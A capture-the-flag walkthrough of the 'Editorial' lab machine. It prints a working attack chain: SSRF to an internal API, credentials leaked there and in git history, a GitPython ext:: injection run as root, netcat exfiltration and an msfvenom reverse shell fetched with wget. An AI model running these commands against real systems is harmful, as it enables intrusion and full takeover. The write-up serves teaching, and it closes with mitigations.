# Editorial

- Introduction
- Summary
- Walkthrough
- Mitigrations
- References 


## Editorial

## Introduction 

The Editorial box shows the importance of access control measures and the danger of server-site request forgery (SSRF). The box next gives an example of the potential dangers of mismanaging development repositories. The box ends with an reminder of the importance of software management. 


## Summary 

The box starts with a SSRF vulnerability that allowed the tester to access an internal api. The api contained credential for the "Dev" account. The "Dev" account was able to access the git repository logs and obtain the credential for the "Prod" account. The "Prod" was able able to run a python script, using a vulnerable git module, as root therefore achieve root access.



The tester started by enumerating the the target using nmap.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-06 12:44 BST
Stats: 0:03:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 55.98% done; ETC: 12:49 (0:02:33 remaining)
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.068s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 340.74 seconds    
```

The scan showed that two ports were open.

The tester found a image upload feature that uses a URL to fetch the image. The tester was able to use this feature to access internal resources, unintentionally exposed by the feature. The tester used the ZAP tool to brute force internal ports for open HTTP services. The tester selected the port portion of the address to be tested with all 65535 ports.


--- Image of the ZAP Fuzzer set up.



--- Image of the results showing that port 5000 is open.


The tester found that port 5000 returned a successful result. Viewing the file reveals the root page of an API. The Root page shows further pages. Testing the other pages, the tester.

```
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}

```

The "http://127.0.0.1:5000/api/latest/metadata/messages/authors" end contains credentials for the "dev" account.


```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}

```

The tester used the credentials to log into the host eith SSH.

```
└─$ ssh dev@10.10.11.20
dev@10.10.11.20's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Jul  9 01:23:19 PM UTC 2024

  System load:           0.0
  Usage of /:            60.9% of 6.35GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.20
  IPv6 address for eth0: dead:beef::250:56ff:fe94:df97


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul  9 12:14:48 2024 from 10.10.14.3
dev@editorial:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)

```


The tester found a git repository in the "dev" home directory.  The tester checked the commits and found that the location where the "dev" credentials were found were previously the credentials for the "prod" account. 

```
dev@editorial:~/apps$ git log --follow -p  -- app_api/app.py
commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

<snip>

index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------


<snip>

+# -------------------------------
+app = Flask(__name__)

```

The tester used these credentials to access the host as the "prod" account. The "prod" was able to run the "clone_prod_change" python script as root.

```
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Sorry, try again.
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

The script used the python git module to clone a repository. This module has a vulnerability that allows remote code execution. The tester tested the vulnerability by using "Netcat" to send the output from the id command to the testers machine. 

```
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c id${IFS}|${IFS}nc${IFS}10.10.14.9${IFS}8080'

```

```
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.20] 43368
uid=0(root) gid=0(root) groups=0(root)
```

Once the tester established the vulnerability worked they generated a reverse shell payload using Msfvenom and set up a listener with metasploit.

```
┌──(kali㉿kali)-[~/Documents/editorial]]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=8080 -f elf -o reverse.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: reverse.elf

┌──(kali㉿kali)-[~/Documents/editorial]]
└─$ 
```


```
msf6 exploit(multi/handler) > options

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.9       yes       The listen address (an interface may be specified)
   LPORT  8080             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.9:8080 

```
The tester used "Wget" to download the payload to the target host and made it executable. 
```
prod@editorial:/tmp$ wget http://10.10.14.9/reverse.elf
--2024-07-11 13:19:36--  http://10.10.14.9/reverse.elf
Connecting to 10.10.14.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250 [application/octet-stream]
Saving to: ‘reverse.elf’

reverse.elf                                                         100%[=================================================================================================================================================================>]     250  --.-KB/s    in 0s      

2024-07-11 13:19:36 (21.2 MB/s) - ‘reverse.elf’ saved [250/250]

prod@editorial:/tmp$ chmod +x /tmp/reverse.elf 

```

```
┌──(kali㉿kali)-[~/Documents/editorial]]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.20 - - [11/Jul/2024 14:18:28] "GET /reverse.elf HTTP/1.1" 200 -
```

The tester ran the payload using the exploiting the vulnerability using the following command.

```
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /tmp/reverse.elf'

```

```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.9:8080 
[*] Sending stage (3045380 bytes) to 10.10.11.20
[*] Meterpreter session 1 opened (10.10.14.9:8080 -> 10.10.11.20:56586) at 2024-07-11 14:25:20 +0100

meterpreter > getuid
Server username: root

```

## Mitigations

- Ensure that internal resoruces are not forgotten or over looked when implomenting security measures.
- Remove sensitive information from repositories if possible and from log and history files. 
- Upgrade `GitPython` to version 3.1.30 or higher.

## References

https://owasp.org/Top10/A01_2021-Broken_Access_Control/
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository
